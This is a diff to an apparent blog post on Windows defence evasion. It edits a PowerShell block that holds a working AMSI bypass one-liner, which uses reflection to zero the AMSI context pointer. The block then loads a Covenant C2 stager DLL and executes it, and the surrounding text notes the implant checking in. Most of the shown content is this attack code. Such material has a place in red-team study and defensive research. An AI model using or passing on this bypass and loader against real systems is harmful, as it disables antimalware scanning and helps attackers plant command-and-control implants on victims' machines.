@@ -647,16 +647,16 @@ __Note:__ 🚩 The most basic (although not very interesting) method of loading 
 
 ```powershell
 
-Amsi-Bypass
-
+# Patch Amsi
 $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
 
 PS > [System.Reflection.Assembly]::LoadFile("C:\Users\IEUser\Desktop\covenant-DLL-noAmsi.dll")
 PS > [MonkStager.MonkStager]::Execute()
 
-
-
 ```
+<p align="center">
+  <img src="/assets/posts/2021-03-01-Windows-Evasion/cov5.JPG">
+</p>
 
 And note the Grunt checking in:
 
